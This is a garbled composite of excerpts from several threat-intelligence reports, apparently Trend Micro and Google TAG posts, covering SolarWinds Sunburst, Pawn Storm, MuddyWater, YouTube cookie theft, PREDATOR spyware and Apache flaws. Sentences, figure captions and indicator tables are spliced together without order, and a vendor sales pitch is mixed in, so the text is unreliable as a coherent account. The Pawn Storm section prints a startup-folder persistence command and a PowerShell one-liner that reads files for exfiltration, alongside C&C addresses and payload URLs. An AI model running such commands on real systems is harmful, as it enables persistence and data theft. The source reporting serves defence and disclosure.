Trend Micro Solutions Customers of the Trend Micro™ TippingPoint™ solution are protected from this threat via these MainlineDV filters: 2573: MINER - TCP (Request) Indicators of Compromise (IoCs) File name SHA256 Detection rsync 0d71a39bbd666b5898c7121be63310e9fbc15ba16ad388011f38676a14e27809 Backdoor.Perl.SHELLBOT.AB ps bb1c41a8b9df7535e66cf5be695e2d14e97096c4ddb2281ede49b5264de2df59 Backdoor.Linux.SSHDOOR.AB cron 4efec3c7b33fd857bf8ef38e767ac203167d842fdecbeee29e30e044f7c6e33d Coinminer.Linux.MALXMR.UWEJN anacron 66b79ebfe61b5baa5ed4effb2f459a865076acf889747dc82058ee24233411e2 tsm32 0191cf8ce2fbee0a69211826852338ff0ede2b5c65ae10a2b05dd34f675e3bae Trojan.Linux.SSHBRUTE.A tsm64 085d864f7f06f8f2eb840b32bdac7a9544153281ea563ef92623f3d0d6810e87 URLs • 146[.]185[.]171[.]227:443 • C&C for Backdoor.Perl.SHELLBOT.AB - 5[.]255[.]86[.]129:3333 • C&C for Backdoor.Linux.SSHDOOR.AB - 54[.]37[.]70[.]249/.satan • 54[.]37[.]70[.]249/rp • hxxp://54[.]37[.]70[.]249/.x15cache • hxxp://54[.]37[.]70[.]249/dota2.tar.gz • hxxp://54[.]37[.]70[.]249/fiatlux-1.0.0.apk • APK file hosted on this server - hxxp://mage[.]ignorelist[.]com/dota.tar.gz • mage[.]ignorelist[.]com • zergbase[.]mooo[.]com Tags Malware | APT & Targeted Attacks | Endpoints | Research
Update on 12/29/2020 2:40 PM PST:
Information on Supernova added Update on 1/22/2021 4:56 PM PST:
Trend Micro's Zero-Day Initiative (ZDI) provided technical analysis of recently patched vulnerabilities in the SolarWinds Orion Platform.
"These vulnerabilities, when combined, could allow an unauthenticated attacker to execute arbitrary code as Administrator on an affected system."
Various sources have recently disclosed a sophisticated attack that hit organizations via the supply chain.
This was carried out via a compromised version of a network monitoring application called SolarWinds Orion.
This backdoor provided the attacker with complete access to the targeted organization’s network.
What is Sunburst?
Sunburst is a sophisticated backdoor that provides an attacker nearly complete control over an affected system.
"It has several peculiarities in its behavior, however."
"This specific set of circumstances makes analysis by researchers more difficult, but it also limits the scope of its victims to some degree."
"The commands that can be executed include: Registry operations (read, write, and delete registry keys/entries) File operations (read, write, and delete files) Run/stop processes Reboot the system What is Supernova?"
"Supernova, one of the malicious components associated with the attack, is a .NET web shell backdoor that presents itself as a legitimate SolarWinds web service handler."
It is a second-stage payload in the attack.
It can also execute web shell commands via a specific HTTP request format.
Who is affected?
It is believed that Sunburst was delivered via a trojanized version of the Orion network monitoring application.
This was done as part of the build process; the source code repository was not affected.
"According to the SolarWinds SEC filing, this trojanized version was downloaded by under 18,000 customers from March to June of 2020."
Solutions
"The directive treats agencies to treat said machines as compromised, with credentials used by said machines to be changed as well."
Indicators of Compromise
Trend Micro Detection 019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134 2f1a5a7411d015d01aaee4535835400191645023 Backdoor.
MSIL.SUNBURST.A c15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71 75af292f34789a1c782ea36c7127bf6106f595e8
Trojan.MSIL.SUPERNOVA.A ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6 d130bd75645c2433f88ac03e73395fba172ef676 Backdoor.
MSIL.SUNBURST.A 32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77 76640508b1e7759e548771a5359eaed353bf1eec
Backdoor.
MSIL.SUNBURST.A
d0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600 1b476f58ca366b54f34d714ffce3fd73cc30db1a
Backdoor.MSIL.SUNBURST.A
"In the second half of 2017 Pawn Storm, an extremely active espionage actor group, didn’t shy away from continuing their brazen attacks."
We saw attacks against political organizations again in the second half of 2017.
"In summer and fall of 2017, we observed Pawn Storm targeting several organizations with credential phishing and spear phishing attacks."
"Pawn Storm’s modus operandi is quite consistent over the years, with some of their technical tricks being used repeatedly."
"The method, which we first discussed in 2014, involves changing a browser tab to point to a phishing site after distracting the target."
The screenshots below show two typical credential phishing emails that targeted specific organizations in October and November 2017.
The other says there is a new file on the company’s OneDrive system.
Figure 1. A sample of a credential phishing email Pawn Storm sent in October and November 2017 Figure 2.
Second type of credential phishing email that was sent by Pawn Storm in November 2017.
The logo of the target organization has been removed from the screenshot and the color was changed as not to reveal the source.
We successfully prevented both attacks from causing any harm.
In one case we were able to warn the target within two hours after a dedicated credential phishing site was set up.
"In an earlier attack, we were able to warn the organization 24 hours before the actual phishing emails were sent."
Olympic Wintersports Federations
Political targets
"In the week of the 2017 presidential elections in Iran, Pawn Storm set up a phishing site targeting chmail.ir webmail users."
"We were able to collect evidence that credential phishing emails were sent to chmail.ir users on May 18, 2017, just one day before the presidential elections in Iran."
"Beginning in June 2017, phishing sites were set up mimicking the ADFS (Active Directory Federation Services) of the U.S. Senate."
"By looking at the digital fingerprints of these phishing sites and comparing them with a large data set that spans almost five years, we can uniquely relate them to a couple of Pawn Storm incidents in 2016 and 2017."
"The real ADFS server of the U.S. Senate is not reachable on the open internet, however phishing of users’ credentials on an ADFS server that is behind a firewall still makes sense."
"In case an actor already has a foothold in an organization after compromising one user account, credential phishing could help him get closer to high profile users of interest."
The future of politically motivated campaigns Rogue political influence campaigns are not likely to go away in the near future.
This makes them vulnerable to hacking and spear phishing.
"As we have mentioned in our overview paper on Pawn Storm, other actors may also start their own campaigns that aim to influence politics and issues of interest domestically and abroad."
"In 2016, we published a report on C Major, an espionage group that primarily targets the Indian military."
"With the Olympics and several significant global elections taking place in 2018, we can be sure Pawn Storm’s activities will continue."
Indicators of Compromise (IoCs): adfs[.]senate[.]group adfs-senate[.]email adfs-senate[.]services adfs.senate[.]qov[.]info chmail.ir[.]udelivered[.]tk webmail-ibsf[.]org fil-luge[.]com biathlovvorld[.]com mail-ibu[.]eu fisski[.]ca iihf[.]eu Tags Malware | APT & Targeted Attacks | Endpoints | Research | Phishing | Network
"Since late 2019, our team has disrupted financially motivated phishing campaigns targeting YouTubers with Cookie Theft malware."
"The actors behind this campaign, which we attribute to a group of hackers recruited in a Russian-speaking forum, lure their target with fake collaboration opportunities (typically a demo for anti-virus software, VPN, music players, photo editing or online games), hijack their channel, then either sell it to the highest bidder or use it to broadcast cryptocurrency scams."
"In collaboration with YouTube, Gmail, Trust & Safety, CyberCrime Investigation Group and Safe Browsing teams, our protections have decreased the volume of related phishing emails on Gmail by 99.6% since May 2021."
"We blocked 1.6M messages to targets, displayed ~62K Safe Browsing phishing page warnings, blocked 2.4K files, and successfully restored ~4K accounts."
"Moreover, to protect our users, we have referred the below activity to the FBI for further investigation."
"Cookie Theft, also known as “pass-the-cookie attack,” is a session hijacking technique that enables access to user accounts with session cookies stored in the browser."
The phishing typically started with a customized email introducing the company and its products.
"Once the target agreed to the deal, a malware landing page disguised as a software download URL was sent via email or a PDF on Google Drive, and in a few cases, Google documents containing the phishing links."
"During the pandemic, we also uncovered attackers posing as news providers with a “Covid19 news software.”"
The following screenshot is an example of a fake page where the original URL is replaced with one leading to a cookie theft malware download.
"Because Google actively detects and disrupts phishing links sent via Gmail, the actors were observed driving targets to messaging apps like WhatsApp, Telegram or Discord."
"Some commodity malware used included RedLine, Vidar, Predator The Thief, Nexus stealer, Azorult, Raccoon, Grand Stealer, Vikro Stealer, Masad (Google’s naming), and Kantal (Google’s naming) which shares code similarity with Vidar."
Open source malware like Sorano and AdamantiumThief were also observed.
A few were observed displaying a fake error message requiring user click-through to continue execution.
"On account-trading markets, hijacked channels ranged from $3 USD to $4,000 USD depending on the number of subscribers."
We are continuously improving our detection methods and investing in new tools and features that automatically identify and stop threats like this one.
Our recommendations: Additional resources: Avoid & Report Phishing Emails.
Related Malware hashes: Top Phishing Domains:
"Likewise, brute force attacks on internet-facing services like email, Microsoft Autodiscover, SMB, LDAP, and SQL are so common that they may seem like background noise that can be ignored."
The RATs were also sent to a wider net of targets including various industries around the world.
"The group also performed widespread brute force attacks to steal credentials such as those of corporate email accounts, as evidenced by network probes we attribute to Pawn Storm and the loose way the actor abused compromised email accounts in malware and in sending spear-phishing emails."
"Recently, Norwegian authorities announced that Pawn Storm hacked the Norwegian parliament through brute force attacks."
"As shown in incremental improvements, subsequent versions of the malware hint towards a learning curve of the malware author that is more typical for an inexperienced actor than for an advanced actor."
"This mistake was corrected swiftly, but it shows the relative inexperience of this particular Pawn Storm operator."
"However, we have solid attribution for these samples based on our long-term monitoring of Pawn Storm’s activities."
"Recap of recent Pawn Storm activities Compromising accounts of users from the Middle East Trend Micro has been closely and consistently monitoring the activities of Pawn Storm, and in March 2020, we released our latest research on the group."
"In the aforementioned research paper, we shared that Pawn Storm heavily abuses compromised accounts — mainly in the Middle East — to send spear-phishing emails."
The abuse of compromised email accounts in the Middle East continued in 2020.
"The group then logged in to a compromised email account of a chicken farm in Oman, and then sent out credential phishing spam messages to high-profile targets around the world."
"Since August 2020, they didn’t use these email addresses to only send spear-phishing emails, but also as a way to communicate with compromised systems in IMAP RATs."
Brute force attacks
"We think that Pawn Storm compromises lots of email accounts through brute force attacks on internet-facing services like email, LDAP, Microsoft Autodiscover, SMB, and SQL."
"For example, in May 2020, Pawn Storm scanned IP addresses worldwide, including IP addresses from the defense industry in Europe, on TCP port 445 and 1433, likely in an attempt to find vulnerable SMB and SQL servers or brute force credentials."
"In 2020, Pawn Storm often tries to obfuscate these brute force attempts by routing their attack traffic over Tor and VPN servers."
Yet this is not always enough to hide these activities.
"In a Microsoft article about brute-forcing Office365 credentials over Tor, Microsoft attributed the activities to Strontium, which is another name for Pawn Storm."
We wrote about related attacks in early 2020.
"These brute force attacks started in 2019, and then we could firmly attribute them to Pawn Storm because we could cross-relate the extensive probing of Microsoft Autodiscover servers around the world with high-confidence indicators of the group’s more traditional attack methods (spear phishing and credential phishing)."
"To illustrate the simplicity of the malware in Pawn Storm’s recent spear-phishing attacks, we describe one example below:"
Technical analysis of Google Drive RAT Figure 1. Spear phishing email from Pawn Storm – collected in August 2020.
"Starting from August 2020, Pawn Storm has sent several spear phishing emails with a malicious RAR attachment."
Among the earliest samples we received were two almost identical RAR files that contained a file called info.exe.
We have: c4a61b581890f575ba0586cf6d7d7d3e0c7603ca40915833d6746326685282b7
installing decrypt.exe – 661d4a0d877bac9b813769a85c01bce274a77b29ccbd4b71e5b92df3c425b93b gdrive.exe – cbd9cb7b69f864ce8bae983ececb7cf8627f9c17fdaba74bd39baa5cdf605f79 3fd45b9b33ff5b6363ba0013178572723b0a912deb8235a951aa3f0aa3142509 installing decrypt.exe – 661d4a0d877bac9b813769a85c01bce274a77b29ccbd4b71e5b92df3c425b93b gdrive.exe – 2060f1e108f5feb5790320c38931e3dc6c7224edf925bf6f1840351578bbf9cc Decoy File
Figures 2-3.
The message box that decrypt.exe displays
"The different versions of gdrive.exe are almost identical, with a minor addition to the file 2060f1e108f5feb5790320c38931e3dc6c7224edf925bf6f1840351578bbf9cc of base64 encoding on the victim’s id."
"It does this via cmd.exe with the following command: move /Y ""{malware_location}"" ""C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\gdrive.exe"" Every time the malware runs a command using cmd.exe, the standard output (STDOUT) of the executed command is piped and written to a Google Drive account with the following filename format: {utcnow}_report_{victim’s id} Figure 6."
Figures 7-8.
"Receiving commands and data exfiltration Every 20 minutes, the bot checks for a file in Google Drive."
If a file with a corresponding filename format exist (cmd_{victim’s id})
showing
waiting for commands
", the attacker can exfiltrate data/documents using the following commands: powershell -command ""[Convert]::ToBase64String([IO.File]::ReadAllBytes('{filename}') Figure 11."
Code snippets showing the exfiltration of data The secondary payload with the filename Google Drivemonitor.exe (0b94e123f6586967819fa247cdd58779b1120ef93fa1ea1de70dffc898054a09) is a keylogger.
Figure 12.
Code snippets showing keylogs This secondary payload does not have any function to upload the collected keystrokes back to the attacker.
"Eventually, the threat actor added improvements to the malware, like encryption."
Later the actor started to use IMAP RATs as well.
Indicators of compromise IP addresses IP address Description Dates active 34.243.239[.]199 Connects to email servers of compromised accounts.
"IP address possibly compromised by Pawn Storm. October 29, 2020 – December 8, 2020 74.208.228[.]186 Connects to email servers of compromised accounts."
IP address possibly compromised by Pawn Storm.
"October 15, 2020 – December 14, 2020 193.56.28[.]25 Scans TCP port 445 and 1433 May 21 – May 26, 2020 195.191.235[.]155 Scans UDP port 389 August 22, 2020 Files SHA256 Filename Description Trend Micro Pattern Detection Trend Micro Machine Learning Detection c4a61b581890f575ba0586cf6d7d7d3e0c7603ca40915833d6746326685282b7 info.exe Google Drive RAT Trojan.MSIL.DRIVEOCEAN.A Troj.Win32.TRX.XXPE50FSX005 3fd45b9b33ff5b6363ba0013178572723b0a912deb8235a951aa3f0aa3142509 info.exe Google Drive RAT Trojan.MSIL.DRIVEOCEAN.A Troj.Win32.TRX.XXPE50FSX005 cbd9cb7b69f864ce8bae983ececb7cf8627f9c17fdaba74bd39baa5cdf605f79 gdrive.exe Google Drive RAT Trojan.MSIL.DRIVEOCEAN.A Troj.Win32.TRX.XXPE50FFF039 2060f1e108f5feb5790320c38931e3dc6c7224edf925bf6f1840351578bbf9cc gdrive.exe Google Drive RAT Trojan.MSIL.DRIVEOCEAN.A Troj.Win32.TRX.XXPE50FFF039 f364729450cb91b2a4c4e378c08e555137028c63480a221bb70e7e179a03f5cc gdrive.exe Google Drive RAT Trojan.MSIL.DRIVEOCEAN.A N/A e3894693eff6a2ae4fa8a8134b846c2acaf5649cd61e71b1139088d97e54236d info.exe IMAP RAT Trojan.MSIL.OCEANMAP.A Troj.Win32.TRX.XXPE50FSX005 83fbd76d298253932aa3e3a9bc48c201fe0b7089f0a7803e68f41792c05c5279 decrypt_v2.4.exe IMAP RAT Trojan.MSIL.OCEANMAP.A Troj.Win32.TRX.XXPE50FSX005 fe00bd6fba209a347acf296887b10d2574c426fa962b6d4d94c34b384d15f0f1 email.exe"
IMAP RAT Trojan
MSIL.OCEANMAP.A
Troj.Win32.TRX.XXPE50FFF039 b61e0f68772f3557024325f3a05e4edb940dbbe380af00f3bdaaaeabda308e72 igmtSX.exe
IMAP RAT Trojan.MSIL.OCEANMAP.A Troj
.Win32.TRX.XXPE50FFF039 c8b6291fc7b6339d545cbfa99256e26de26fff5f928fef5157999d121fe46135
igmtSX.exe IMAP RAT
Trojan.MSIL.OCEANMAP.A
Troj.Win32.TRX.XXPE50FFF039 50b000a7d61885591ba4ec9df1a0a223dbceb1ac2facafcef3d65c8cbbd64d46 email.exe
IMAP RAT Trojan.MSIL.OCEANMAP.A Troj.Win32.TRX.XXPE50FFF039 3384a9ef3438bf5ec89f268000cc7c83f15e3cdf746d6a93945add300423f756 email.exe
IMAP RAT Trojan.MSIL.OCEANMAP.A Troj
.Win32.TRX.XXPE50FFF039
abf0c2538b2f9d38c98b422ea149983ca95819aa6ebdac97eae777ea8ba4ca8c
email.exe IMAP RAT
Trojan.MSIL.OCEANMAP.A
Troj.Win32.TRX.XXPE50FFF039 faf8db358e5d3dbe2eb9968d8b19f595f45991d938427124161f5ed45ac958d5 email.exe
IMAP RAT Trojan.MSIL.OCEANMAP.A Troj.Win32.TRX.XXPE50FFF039 4c1b8d070885e92d61b72dc9424d9b260046f83daf00d93d3121df9ed669a5f9 email.exe
IMAP RAT Trojan.MSIL.OCEANMAP.A Troj
.Win32.TRX.XXPE50FFF039
770206424b8def9f6817991e9a5e88dc5bee0adb54fc7ec470b53c847154c22b email.exe
IMAP RAT Trojan.MSIL.OCEANMAP.A Troj.Win32.TRX.XXPE50FFF039 6fb2facdb906fc647ab96135ce2ca7434476fb4f87c097b83fd1dd4e045d4e47 email.exe
IMAP RAT Trojan.MSIL.OCEANMAP.A Troj.Win32.TRX.XXPE50FFF039 31577308ac62fd29d3159118d1f552b28a56a9c039fef1d3337c9700a3773cbf
photos.exe IMAP RAT
Trojan.MSIL.OCEANMAP.A
N/A 661d4a0d877bac9b813769a85c01bce274a77b29ccbd4b71e5b92df3c425b93b decrypt.exe
N/A 0b94e123f6586967819fa247cdd58779b1120ef93fa1ea1de70dffc898054a09 Google Drivemonitor.exe keylogger
TrojanSpy
The MuddyWater campaign was first sighted in 2017 when it targeted the Saudi government using an attack involving PowerShell scripts deployed via Microsoft Office Word macro.
"In March 2018, we provided a detailed analysis of another campaign that bore the hallmarks of MuddyWater."
"Like the previous campaigns, these samples again involve a Microsoft Word document embedded with a malicious macro that is capable of executing PowerShell (PS) scripts leading to a backdoor payload."
"One notable difference in the analyzed samples is that they do not directly download the Visual Basic Script(VBS) and PowerShell component files, and instead encode all the scripts on the document itself."
Figure 2.
Figure 3.
Executing the malicious routine via Document_Open()
The code inside the BLUE box constructs the main Powershell commands and scripts.
Figure 4.
"Analysis of the code revealed a PowerShell script capable of decoding the contents of the malicious document, which results in the execution of yet another encoded PowerShell script."
Figure 5.
"The second encoded PowerShell script, which is executed after the first script is decoded This will then result in more readable PowerShell scripts capable of dropping various components in the %Application Data%\Microsoft\CLR\* directory."
"The main PowerShell file invoker.ps1 uses these components to run the final payload, PRB-Backdoor, previously analyzed by other security researchers in May 2018."
"Figure 7: The components dropped in the %Application Data%\Microsoft\CLR\* directory PRB-Backdoor is a backdoor that takes its name from the function used in the final PowerShell script payload, as seen in the figure below. Figure 8."
The PS function from which PRB-Backdoor takes its name
PRB-CREATEALIVE Initializes connection with the C&C Server PRB-CREATEINTRODUCE
Registers
introduces the affected machine to the C&C server PRB-History
"If these samples are indeed related to MuddyWater, this means that the threat actors behind MuddyWater are continuously evolving their tools and techniques to make them more effective and persistent."
"Given the use of lure documents designed with social engineering in mind, it is likely that the attackers use phishing or spam to target users who are unaware of these documents' malicious nature."
Awareness can effectively mitigate or stop these kinds of attacks from being successful.
The first step is to be able to identify phishing attacks and distinguish legitimate emails from malicious ones.
"In general, users should always practice caution when it comes to email."
"Trend Micro™ Hosted Email Security is a no-maintenance cloud solution that delivers continuously updated protection to stop spam, malware, spear phishing, ransomware, and advanced targeted attacks before they reach the network."
Trend Micro™
"Indicators of Compromise (IoCs) Detected as W2KM_DLOADR.UHAOEEN - 240b7d2825183226af634d3801713b0e0f409eb3e1e48e1d36c96d2b03d8836b Tags APT & Targeted Attacks | Endpoints | Research | Articles, News, Reports | Network"
"We discovered a potential targeted attack that makes use of legitimate script engine AutoHotkey, in combination with malicious script files."
"The user would need to enable macro for it to open fully, which would use AutoHotkey in loading the malicious script file to avoid detection."
It will then enable the threat actors to steal certain information and even download TeamViewer to gain remote access to the system.
Figure 2.
Figure 3.
"Connect to the C&C server every 10 seconds to download, save, and execute script files containing the commands."
"Send the volume serial number of the C drive, which allows the attacker to identify the victim."
Figure 4.
A partial code snippet of AutoHotkeyu32.ahk Figure 5.
Further research uncovered other dropped files involved in this attack.
We have yet to conclude this attack's exact purpose.
"For now, we can surmise that it has the makings of a potential targeted attack because of its cyber espionage capabilities, as well as the potential for delivering ransomware and coinminer."
"Users should also take full advantage of their network defense solutions by enhancing settings, especially for macro malware attached emails."
Filename
Detection name Description EFE51C2453821310C7A34DCA3054021D0F6D453B7133C381D75E3140901EFD12 Military Financing.xlsm W2KM_HTV.ZKGD-A
Carries the malicious script and AutoHotkeyU32.ahk 43FBDA74A65668333727C6512562DB4F9E712CF1D5AD9DCA8F06AE51BB937BA2 hscreen.ahk TSPY_HTV.ZJGD-A Takes screen captures ACB3181D0408C908B2A434FC004BF24FB766D4CF68BF2978BC5653022F9F20BE AutoHotkeyU32.ahk BKDR_HTV.ZKGD-A Loads the malicious script BE6C6B0942AD441953B0ED0C4327B9DED8A94E836EACA070ACA3988BADB31858 hinfo.ahk TSPY_HTV.ZLGD-A Gets the computer name F64792324839F660B9BDFDA95501A568C076641CF08CE63C1DDBE29B45623AC0 htv.ahk
TROJ_HTV.ZJGD-A Downloads and executes TeamViewer C&C 185[.]70[.]186[.]145
"At the dawn of the Fourth of July weekend, Kaseya has been hit with a ransomware attack, as reported in the company’s own announcement."
Kaseya provides IT management software to mostly managed service providers (MSPs).
Thankfully Kaseya acted extremely quickly advising all Kaseya VSA on-premises users to shut down their servers until further instructions.
You don’t want to be one of the 50 who got hit by a ransomware.
"For MSPs working with Trend Micro, we have a very positive news."
The ransomware was effectively blocked before the IOCs were added to our backend detection pattern.
You need to make sure your business is protected.
Access
Act fast!
"This offer ends September 30, 2021."
"Just click the URL below for your region, sign up today for your free trial and allow us to help you protect your business."
"To protect our users, Google’s Threat Analysis Group (TAG) routinely hunts for 0-day vulnerabilities exploited in-the-wild."
"If the link was not active, the user was redirected directly to a legitimate website."
"We assess that these campaigns delivered ALIEN, a simple Android malware in charge of loading PREDATOR, an Android implant described by CitizenLab in December 2021."
ALIEN lives inside multiple privileged processes and receives commands from PREDATOR over IPC.
"We did not capture the subsequent stages, but assess the attackers did not have exploits for the current version of Chrome (91.0.4472) at that time, but instead used n-day exploits targeting Samsung Browser, which was running an older and vulnerable version of Chromium."
Related IOCs
"We recovered the exploit used to escape the Chrome Sandbox, but not the initial RCE exploit."
We haven’t retrieved a copy of the exploit.
Related IOCs
Related IOCs
We would also like to thank Project Zero for their technical assistance in helping analyze these bugs.
We remain committed to updating the community as we uncover these campaigns.
We look forward to continuing our work in this space and advancing the safety and security of our users around the world.
"NOTE: On May 20th, we updated our attribution to more precisely describe our findings."
"On any given day, Google's Threat Analysis Group (TAG) is tracking more than 270 targeted or government-backed attacker groups from more than 50 countries."
"Our team of analysts and security experts is focused on identifying and stopping issues like phishing campaigns, zero-day vulnerabilities and hacking against Google, our products and our users."
"Today, we’re sharing recent findings on government-backed phishing, threats and disinformation, as well as a new bulletin to share information about actions we take against accounts that we attribute to coordinated influence campaigns."
"Last month, we sent 1,755 warnings to users whose accounts were targets of government-backed attackers."
"Generally, 2020 has been dominated by COVID-19."
"And as others have reported, we’re seeing a resurgence in COVID-related hacking and phishing attempts from numerous commercial and government-backed attackers."
"To help protect users against these kinds of tracks, our Advanced Protection Program (APP) utilizes hardware security keys and provides the strongest protections available against phishing and account hijackings."
APP was designed specifically for high-risk accounts.
"Our products are designed with robust built-in security features, like Gmail protections against phishing and Safe Browsing in Chrome, but we still dedicate significant resources to developing new tools and technology to help identify, track and stop this kind of activity."
"We will also continue to share more detailed analysis of vulnerabilities we find, phishing and malware campaigns that we see, and other interesting or noteworthy trends across this space."
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q1 of 2020.
"It was last updated on May 27, 2020."
We terminated 3 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Iran.
We received leads from Graphika that supported us in this investigation.
"Google’s Threat Analysis Group (TAG) is a specialized team of security experts that works to identify, report, and stop government-backed phishing and hacking against Google and the people who use our products."
One notable campaign attempted to target personal accounts of U.S. government employees with phishing lures using American fast food franchises and COVID-19 messaging.
"Once people clicked on the emails, they were presented with phishing pages designed to trick them into providing their Google account credentials."
"The vast majority of these messages were sent to spam without any user ever seeing them, and we were able to preemptively block the domains using Safe Browsing."
"We’ve also seen attackers try to trick people into downloading malware by impersonating health organizations: Generally, we’re not seeing an overall rise in phishing attacks by government-backed groups; this is just a change in tactics."
"While it’s not unusual to see some fluctuations in these numbers, it could be that attackers, just like many other organizations, are experiencing productivity lags and issues due to global lockdowns and quarantine efforts."
"Following our November update, today we’re sharing the latest insights to fight phishing, and for security teams, providing more details about our work identifying attacks against zero-day vulnerabilities."
We have a long-standing policy to send you a warning if we detect that your account is a target of government-backed phishing or malware attempts.
"In 2019, we sent almost 40,000 warnings, a nearly 25 percent drop from 2018."
We’ve detected a few emerging trends in recent months.
"Upon reviewing phishing attempts since the beginning of this year, we’ve seen a rising number of attackers, including those from Iran and North Korea, impersonating news outlets or journalists."
"For example, attackers impersonate a journalist to seed false stories with other reporters to spread disinformation."
The chart below details the Russian threat actor group SANDWORM’s targeting efforts (by sector) over the last three years.
"In 2019, one in five accounts that received a warning was targeted multiple times by attackers."
APP provides the strongest protections available against phishing and account hijacking and is specifically designed for the highest-risk accounts.
"Last year, TAG discovered that a single threat actor was capitalizing on five zero-day vulnerabilities."
"The exploits were delivered via compromised legitimate websites (e.g. watering hole attacks), links to malicious websites, and email attachments in limited spear phishing campaigns."
The majority of targets we observed were from North Korea or individuals who worked on North Korea-related issues.
The vulnerabilities underlying these exploits included: Internet Explorer - CVE-2018-8653 Internet Explorer - CVE-2019-0676 Chrome - CVE-2019-5786 Windows Kernel - CVE-2019-0808 Internet Explorer - CVE-2019-1367 Internet Explorer - CVE-2019-1429
Exploiting CVE-2019-0676 enabled attackers to reveal presence or non-presence of files on the victim’s computer; this information was later used to decide whether or not a second stage exploit should be delivered.
The attack vector for CVE-2019-1367 was rather atypical as the exploit was delivered from an Office document abusing the online video embedding feature to load an external URL conducting the exploitation.
This is an area we have invested in deeply for over a decade.
"In the past, we’ve posted on issues like phishing campaigns, vulnerabilities and disinformation."
TAG tracks more than 270 targeted or government-backed groups from more than 50 countries.
We use the intelligence we gather to protect Google infrastructure as well as users targeted with malware or phishing.
"We’ve had a long-standing policy to send users warnings if we detect that they are the subject of state-sponsored phishing attempts, and have posted periodically about these before."
"From July to September 2019, we sent more than 12,000 warnings to users in 149 countries that they were targeted by government-backed attackers."
Over 90 percent of these users were targeted via “credential phishing emails” similar to the example below.
"We encourage high-risk users—like journalists, human rights activists, and political campaigns—to enroll in our Advanced Protection Program (APP), which utilizes hardware security keys and provides the strongest protections available against phishing and account hijackings."
APP is designed specifically for the highest-risk accounts.
"In the simple phishing example below, an attacker has sent a phishing email with a security alert lure from “Goolge” suggesting the user secure their account."
"Last week at CyberwarCon, we presented analysis about previously undisclosed campaigns from a Russia-nexus threat group called “Sandworm” (also known as “Iridium”)."
"Although much of Sandworm’s activity targeting Ukraine and their attacks against the 2018 Winter Olympics have been covered publicly, some campaigns have not been reported."
"In December 2017, TAG discovered a series of campaigns from Sandworm attempting to deploy Android malware."
They then uploaded these modified apps to the Play Store using their own attacker-controlled developer accounts.
"This application had approximately 1,000 total installs."
"In November 2018, we saw evidence that Sandworm shifted from using attacker-controlled accounts to try and upload malicious apps to compromising legitimate developers."
"Throughout November, Sandworm targeted software and mobile app developers in Ukraine via spear phishing emails with malicious attachments."
"After compromising the developer, Sandworm built a backdoor in one of the legitimate apps and attempted to publish it on the Play Store."
The operations use inauthentic news outlets to disseminate messages promoting Russian interests in Africa.
"Activity on Google services was limited, but we enforced across our products swiftly."
"As organizations reeled from the Log4Shell vulnerability (CVE-2021-44228), cyberattacks aiming at open-source web servers, like Apache HTTP Server, were rapidly rising."
"To protect enterprises against malicious activities, we need more than just timely patches."
"Vulnerabilities of Apache HTTP Server have increased since 2017 Open-source web servers, especially Apache HTTP Server, have been heavily exploited in the past five years."
"Compared to Nginx, another widely used open-source web server, Apache had the greatest increase in vulnerabilities over the past five years – particularly high-risk ones."
"According to the Apache HTTP Server webpage, from 2012 to 2016 there were a total of 31 vulnerabilities found in the Apache HTTP Server."
"However, from 2017 to 2021 the total vulnerabilities number surged to 57."
"2021 alone accounted for 14 of those vulnerabilities, breaking a 17-year record high."
"Before that, there were no vulnerabilities rated at this level."
Source: Apache HTTP Server Project
"The most common types of attack include denial of service (DoS), path traversal, server-side request forgery (SSRF), and remote code execution (RCE)."
Table 1: The 15 vulnerabilities weaponized since 2017 CVE ID cvss3 score Description CVE-2021-42013 9.8 Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.49 and 2.4.50 (incomplete fix of CVE-2021-41773) CVE-2021-41773 7.5
"Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49 CVE-2021-40438 9 mod_proxy SSRF CVE-2020-11984 9.8 mod_proxy_uwsgi buffer overflow CVE-2019-10098 6.1 mod_rewrite potential open redirect CVE-2019-10097 7.2 CVE-2019-10097 mod_remoteip Stack buffer overflow and NULL pointer dereference CVE-2019-0190 7.5 mod_ssl 2.4.37 remote DoS when used with OpenSSL 1.1.1 CVE-2018-8011 7.5 mod_md, DoS via Coredumps on specially crafted requests CVE-2018-1303 7.5 Possible out of bound read in mod_cache_socache CVE-2018-11763 5.9 DoS for HTTP/2 connections by continuous SETTINGS CVE-2017-9798 7.5 Use-after-free when using <Limit > with an unrecognized method in .htaccess (""OptionsBleed"") CVE-2017-9788 9.1 Uninitialized memory reflection in mod_auth_digest CVE-2017-7668 9.8 ap_find_token()"
Buffer
Overread
CVE-2017-7659 7.5 mod_http2
"Source: Apache HTTP Server Project, Trend Micro Inc., NVD CVE-2021-41773 and CVE-2021-42013, the two critical vulnerabilities, are perfect examples of how attackers exploit the vulnerabilities in the Apache HTTP Server."
"As Trend Micro reported, these two are path traversal vulnerabilities that allow attackers to map URLs to files/directories outside of the webroot."
Schemes behind the attacks The attacks that target open-source web servers could lead to enormous threats.
Attackers can also install a phishing website on the victim server to gain access to any data that passes through it.
"Major web service providers such as Slack, Linkedin, The New York Times, GrubHub, and more rely on Apache HTTP Server."
"Furthermore, the complexity of the software supply chain nowadays exacerbates the abuse of open-source software vulnerabilities."
Cyber attackers could compromise software components of third-party suppliers by inserting malicious code inconspicuously.
"Protect your web server against potential harm To mitigate the potential risk of attacks from open-source software, software composition analysis (SCA) has become an effective approach."
These tools can also check for legal issues regarding the use of open-source software with different licensing terms and conditions.
Assessing the criticality of those systems that contain those CVEs.
i. Is a POC available ii. Is it in the wild
"Additional analysis and insights by Higashi Yuka and Chizuru Toyama REDBALDKNIGHT, also known as BRONZE BUTLER and Tick, is a cyberespionage group known to target Japanese organizations such as government agencies (including defense) as well as those in biotechnology, electronics manufacturing, and industrial chemistry."
"Their campaigns employ the Daserf backdoor (detected by Trend Micro as BKDR_DASERF, otherwise known as Muirim and Nioupale) that has four main capabilities: execute shell commands, download and upload data, take screenshots, and log keystrokes."
